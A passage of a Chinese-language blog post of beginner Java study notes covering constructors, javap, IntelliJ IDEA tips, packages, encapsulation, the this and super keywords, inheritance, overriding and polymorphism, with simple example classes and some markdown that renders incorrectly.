src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220818231943.png"></li><li>  <strong>一个形参列表中只能有一个可变参数</strong>，并且需要<strong>放到参数列表的最后</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220818231915.png"></li></ol><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ol><li>  前面的都是先创建好一个对象之后，再给他的年龄赋值</li><li>  现在要求：在创建人类的对象时，<strong>直接指定这个对象的年龄和姓名</strong>，一次完成</li><li>  构造器的主要目的：<strong>完成对新对象的初始化</strong>，<strong>而不是创建新对象</strong></li></ol><h2 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span>修饰符<span class="token punctuation">]</span> 方法名<span class="token punctuation">(</span>形参列表<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>方法体<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>  构造器的修饰符是可以默认的</li><li>  构造器<strong>没有返回值</strong>，<strong>只有构造器可以没有返回值，没有返回值的只有构造器</strong></li><li>  <strong>方法名必须和类名一样</strong></li><li>  参数列表和成员方法一样的规则</li><li>  构造器的调用，由系统完成</li><li>  一个类可以<strong>定义多个不同的构造器</strong>，即<strong>构造器重载</strong>，当构成重载时，未指定的参数将会赋值为默认值</li><li>  如果程序员<strong>没有定义构造器</strong>，系统会自动给类生成一个<strong>默认无参构造器</strong>，比如Dog(){},使用javap指令反编译可以查看源代码</li><li>  一旦<strong>定义了自己的构造器</strong>，<strong>默认的构造器就覆盖了</strong>，就<strong>不能再使用默认的构造器</strong>，除非<strong>显式地声明</strong>一下，和自己定义的<strong>构成重载</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819102347.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819094352.png"></li></ol><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test02</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 当new一个对象时，直接通过构造器指定名字和年龄</span>        <span class="token comment">// 在new的时候直接传参，可以使用构造器</span>        <span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"smith"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 构造器在被调用的时候，对象应该已经被创建了</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> pname<span class="token punctuation">,</span> <span class="token keyword">int</span> page<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        name <span class="token operator">=</span> pname<span class="token punctuation">;</span>        age <span class="token operator">=</span> page<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  构造器在被调用的时候，对象已经被创建了，是通过new 类（）,括号进行传参</li></ol><h2 id="Javap的使用"><a href="#Javap的使用" class="headerlink" title="Javap的使用"></a>Javap的使用</h2><ol><li><p>  javap时jdk提供的一个命令行工具，Javap能对给定的class文件提供字节代码进行<strong>反编译</strong></p></li><li><p>  通过它，可以查看到源代码</p></li><li><p>格式：</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">javap xxx<span class="token punctuation">.</span><span class="token keyword">class</span> 或者 javap xxx <span class="token punctuation">(</span>可以不带<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  -c 对代码进行反汇编</p></li><li><p>  -v 输出附加信息</p></li><li><p>  -p 显式所有类和成员</p></li></ol><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819110038.png"></p><h2 id="Eclipse"><a href="#Eclipse" class="headerlink" title="Eclipse"></a>Eclipse</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819110111.png"></p><h3 id="IDEA使用技巧"><a href="#IDEA使用技巧" class="headerlink" title="IDEA使用技巧"></a>IDEA使用技巧</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820220912.png"></p></li><li><p>  更改编码</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820221204.png"></p></li><li><p>  源码一定要放到src目录下<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820221619.png"></p></li><li><p>  新建一个类时，new java class的时候，不需要带上.java的文件名后缀<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820221711.png"></p></li><li><p>  只需要写清类名，后面自动填上.java</p></li></ol><h3 id="IDEA常用快捷键"><a href="#IDEA常用快捷键" class="headerlink" title="IDEA常用快捷键"></a>IDEA常用快捷键</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820222037.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820222825.png"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820222825.png"></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820223023.png"></p></li><li><p>快速格式化的快捷键：ctrl+alt+L,可以快速补齐代码</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820223336.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820223546.png"></p></li></ol><h3 id="模板快捷键"><a href="#模板快捷键" class="headerlink" title="模板快捷键"></a>模板快捷键</h3><ol><li>  模板可以高效地完成开发，提高效率</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820224053.png"></li></ol><h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820224234.png"></li></ol><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>  可以区分相同名字的类</li><li>  当类很多时，可以很好地管理类（某个类在某个包中，好搜索）</li></ol><h3 id="包的基本语法"><a href="#包的基本语法" class="headerlink" title="包的基本语法"></a>包的基本语法</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>hspedu</span><span class="token punctuation">;</span> <span class="token keyword">package</span> 包的名字<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  package 关键字，表示打包</li><li>  com.hspedu 表示包名</li></ol><h3 id="包的原理"><a href="#包的原理" class="headerlink" title="包的原理"></a>包的原理</h3><ol><li>  包的本质就是创建不同的文件夹来保存文件</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820224744.png"></li></ol><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><ol><li>  打包：选中src -&gt; new -&gt; Package</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820225214.png"></li><li>  点号操作符 . 是用来向下继续引目录的，例如在src下创建包com.abc,是src下有com,com下有abc</li><li>  当有一个相同类名被实例化时，想要实例化另一种类，那么需要用 . 操作符来标识是哪个包（就是加上包名）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820230657.png"></li><li>  如果引用两个相同名字的类，编译器会报错，不能同时引两个Dog</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220820230952.png"></li></ol><h3 id="包的命名规则"><a href="#包的命名规则" class="headerlink" title="包的命名规则"></a>包的命名规则</h3><ol><li>  只能包含数字，字母，下划线，小圆点，但是不能用数字开头，<strong>不能是关键字或保留字</strong></li><li>  即不能包含class等关键字</li><li>  一般是：小写字母 + 小圆点</li><li>  一般是 com.公司名.项目名.业务模块名，最后一级一般是类的名字</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821000432.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821000537.png"></li></ol><h3 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h3><ol><li>  语法：import 包；</li><li>  不要忘记import最后的分号</li><li>  引入的主要目的是：使用该包下面的类</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821001014.png"></li><li>  和python的import相同，可以只导入包中的某个类，也可以使用*去导入所有的包</li><li>  需要使用哪个类就引入哪个类，不一次全部引入某个包中的所有类</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821001215.png"></li><li>  <strong>package</strong>的作用是<strong>声明当前类所在的包</strong>，需要<strong>放在类的最上面</strong>（<strong>一个文件的最上面</strong>），一个类中最多只有一句package</li><li>  一个类中最多只有一句package，即一个类只能属于一个包</li><li>  import指令位置放在<strong>package的下面</strong>，<strong>在类定义的前面</strong>，可以有多句且没有顺序的要求</li></ol><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821170654.png"></li><li>  类似于一个阶梯图形</li><li>  <strong>同类就是本类</strong></li></ol><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><ol><li>  封装就是把抽象出的数据**[属性]<strong>和对数据的操作</strong>[方法]<strong>封装在一起，数据被保护在内部，程序的其它部分只有通过被授权的操作</strong>[方法]**，才能对数据进行操作</li></ol><h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821165718.png"></li></ol><h3 id="封装的实现步骤，三步走"><a href="#封装的实现步骤，三步走" class="headerlink" title="封装的实现步骤，三步走"></a>封装的实现步骤，三步走</h3><ol><li><p>  将<strong>属性私有化 private</strong> 不能直接修改属性</p></li><li><p>提供一个<strong>公共的</strong>set方法，用于对属性进行判断并且赋值</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setXxx</span><span class="token punctuation">(</span>类型 参数名<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//加入数据验证的业务逻辑</span>如果通过则属性<span class="token operator">=</span>参数名<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提供要给<strong>公共的</strong>get方法，用于获取属性的值</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> 数据类型 <span class="token function">getXxx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//权限判断</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="自己写set和get太慢，可以使用快捷键，alt-insert-getter-and-setter"><a href="#自己写set和get太慢，可以使用快捷键，alt-insert-getter-and-setter" class="headerlink" title="自己写set和get太慢，可以使用快捷键，alt + insert,getter and setter"></a>自己写set和get太慢，可以使用快捷键，alt + insert,getter and setter</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821175207.png"></li></ol><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li><p>  set方法返回值为void，不能再写一个变量，赋值给它</p></li><li><p>  并且p1的age是private类型的，不能由其它类访问，所以p1.age本身就是错误的</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821175618.png"></p></li><li><p>  上面就是set方法，又去赋值，是错误的</p></li><li><p>  在调用set方法时，只需要去传参即可</p></li></ol><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><ol><li><p>构造器的形参，如果能够直接写成属性名</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  但是出现了一个问题，根据变量的作用域原则，构造器的name<strong>是局部变量</strong>，<strong>而不是属性</strong>，构造器的age也是<strong>局部变量</strong>，<strong>而不是属性</strong></p></li><li><p>  这样做相当于是name<strong>局部变量又赋值给了它本身</strong>，没有用处，当这个构造器结束时，局部变量的作用域一结束，就什么都没了</p></li></ol><h3 id="什么是this"><a href="#什么是this" class="headerlink" title="什么是this"></a>什么是this</h3><ol><li>  this代表当前对象</li><li>  形象说法：老韩说我的，是指老韩；小明说我的，是指小明，不同的对象指向不同的this</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822102518.png"></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//所以上面的name和age应该加上this,this.age就是当前对象的属性age</span><span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="this小结"><a href="#this小结" class="headerlink" title="this小结"></a>this小结</h3><ol><li>  简单地说：<strong>哪个对象调用，this就代表哪个对象</strong></li></ol><h2 id="命名问题"><a href="#命名问题" class="headerlink" title="命名问题"></a>命名问题</h2><ol><li>  担心命名时使用了关键字，可以在名字后面加上下划线__</li></ol><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="为什么需要继承"><a href="#为什么需要继承" class="headerlink" title="为什么需要继承"></a>为什么需要继承</h3><ol><li>  编写两个类，一个大学生，一个大学毕业生，发现<strong>两个类的属性和方法有很多是相同的</strong></li><li>  <strong>继承提高代码复用性</strong></li></ol><h3 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h3><ol><li><p>  当<strong>多个类</strong>存在<strong>相同的</strong>属性和方法时，可以从这些类中<strong>抽象出父类</strong>，<strong>在父类中定义</strong>这些相同的属性和方法，所有的<strong>子类不需要重新定义这些属性和方法</strong>，只需要通过extends来声明继承父类即可</p></li><li><p>  父类中包含子类中所有属性和方法，子类中可以包含不同的特有属性</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822111602.png"></p></li><li><p>  可以<strong>继续继承</strong>，<strong>下一层会包含上一层的所有属性</strong></p></li><li><p>  我的理解：extends相当于复制了父类中的所有属性和方法</p></li></ol><h3 id="继承细节"><a href="#继承细节" class="headerlink" title="继承细节"></a>继承细节</h3><h4 id="第一：私有属性不能直接在子类中访问"><a href="#第一：私有属性不能直接在子类中访问" class="headerlink" title="第一：私有属性不能直接在子类中访问"></a>第一：私有属性不能直接在子类中访问</h4><ol><li>  子类继承了所有的属性和方法，但是<strong>私有属性不能在子类直接访问</strong>，要通过<strong>公共的方法</strong>去访问</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822114134.png"></li><li>  <strong>访问父类中的private属性</strong>，<strong>可以写一个getter</strong>，return值写private的值，和<strong>封装的原理相同</strong></li></ol><h4 id="第二-父类和子类的构造器调用问题"><a href="#第二-父类和子类的构造器调用问题" class="headerlink" title="第二:父类和子类的构造器调用问题"></a>第二:父类和子类的构造器调用问题</h4><ol><li>  子类必须调用父类的构造器，完成父类的初始化</li><li>  也就是说，在main函数中实例化子类时，是<strong>首先进行父类的构造器调用，然后再进行子类的构造器调用(初始化)</strong></li></ol><h4 id="第三：在父类中没有默认的无参构造器时"><a href="#第三：在父类中没有默认的无参构造器时" class="headerlink" title="第三：在父类中没有默认的无参构造器时"></a>第三：在父类中没有默认的无参构造器时</h4><ol><li>  当创建子类对象时，不管使用子类的哪个构造器，默认情况下<strong>总会去调用父类的无参构造器</strong>，如果父类没有提供无参构造器，则必须在<strong>子类的构造器中用super</strong>去<strong>指定使用</strong>父类的哪个构造器<strong>完成对父类的初始化工作</strong>，否则编译不会通过</li></ol><h4 id="第四：指定调用父类的某个构造器"><a href="#第四：指定调用父类的某个构造器" class="headerlink" title="第四：指定调用父类的某个构造器"></a>第四：指定调用父类的某个构造器</h4><ol><li><p>  指定地去调用父类的某个构造器，则需要显式的调用</p></li><li><p>```java<br>  super(参数列表)</p>  <pre class="line-numbers language-none"><code class="language-none">3.   调用父类中的**无参构造器**，super()中的参数什么都不写，默认调用super()#### 第五：super的使用1.   super在使用时，**必须放在构造器的第一行**2.   super关键字**只能在构造器中使用，不能在普通成员方法中使用**#### 第六：1.   super()和this()都只能放在构造器的第一行，因此这两个方法不能共存在一个构造器#### 第七：object类1.   Java所有类都是Object的子类，Object是所有类的基类2.   按住 **ctrl + h** 可以看到所有类的父子关系3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220822171532.png)4.   如果new了最后一个子类，会**一级一级地调用上一级的构造器**，直到**调用到了顶级父类的构造器**，**Object类**5.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220822171916.png)#### 第九：单继承1.   子类最多**只能继承一个父类**，即Java中式**单继承机制**2.   如果想让A继承B和C，则可以让**A继承B，B继承C**#### 第十：不能滥用继承1.   不能滥用继承，子类和父类之间必须满足 **is-a** 的逻辑关系2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220822172523.png)## super### 概念1.   super代表父类的引用，用于访问父类的属性，方法，构造器### 具体用法1.   访问父类的属性，但是不能访问父类的private属性,可以     &#96;&#96;&#96;java     super.属性名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>访问父类的方法，不能访问父类的private方法</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">super</span><span class="token punctuation">.</span>方法名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span>；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用父类的构造器（因为只有一个父类，所以不需要加父类的名字就可以区分），当参数不同时,调用语法：</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">super</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="方法的重写-override"><a href="#方法的重写-override" class="headerlink" title="方法的重写 override"></a>方法的重写 override</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ol><li>  方法覆盖(重写)就是子类有一个方法，和父类的某个方法的<strong>名称，返回类型，参数</strong>，都一样，那么就说子类的这个方法覆盖了父类的那个方法</li></ol><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Override</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Override01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"动物叫唤"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//父类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Override</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token keyword">extends</span> <span class="token class-name">Override01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"小狗汪汪叫"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//子类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  因为Dog是Animal子类</li><li>  Dog的cry方法和Animal的cry定义形式一样(名称，返回类型，参数)</li><li>  这时，我们就说Dog的cry方法，重写了Animal的cry方法</li></ol><h3 id="方法重写细节"><a href="#方法重写细节" class="headerlink" title="方法重写细节"></a>方法重写细节</h3><ol><li><p>  方法重写也叫方法覆盖，需要满足下面的条件</p></li><li><p>  子类的方法的<strong>参数，方法名称，要和父类方法的参数，方法名称完全一样</strong>，否则不构成重写</p></li><li><p>  子类方法的返回类型和父类一样，或者，是父类返回类型的子类，比如父类返回类型是Object，子类方法返回类型是String</p></li><li><p>```java</p><pre><code>  public Object cry() &#123;      return null;  &#125;//父类      public String cry()&#123;      return null;  &#125;//子类</code></pre><pre class="line-numbers language-none"><code class="language-none">5.   否则会报错![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220822181100.png)6.   子类方法不能缩小父类方法的访问权限 public -&gt; protected -&gt; 默认 -&gt; private7.   也就是说，返回类型可以细化，但是访问范围不能缩小8.   例如：父类中为public , 子类中为private，则会报错9.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220822181730.png)## 多态polymorphic### 解决的问题1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220822222119.png)&#96;&#96;&#96;javapackage A;public class Master &#123;    private String name;    public Master(String name) &#123;        this.name &#x3D; name;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name &#x3D; name;    &#125;    &#x2F;&#x2F;给小狗吃骨头    public void feed(Dog dog,Bone bone)&#123; &#x2F;&#x2F;这个地方的参数，和int a一样，只是声明了数据类型和变量名        System.out.print(&quot;主人&quot; + name + &quot;给&quot; + dog.getName() + &quot;吃&quot; + bone.getName());    &#125;    &#x2F;&#x2F;给小猫吃🐟，和给狗吃骨头构成重载    public void feed(Cat cat,Fish fish)&#123;        System.out.print(&quot;主人&quot; + name + &quot;给&quot; + cat.getName() + &quot;吃&quot; + fish.getName());    &#125;    &#x2F;&#x2F;如果有很多动物和食物，会导致feed重载量很大&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Poly01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Poly01</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Fish</span> <span class="token keyword">extends</span> <span class="token class-name">Poly01</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Fish</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Bone</span> <span class="token keyword">extends</span> <span class="token class-name">Poly01</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Bone</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token 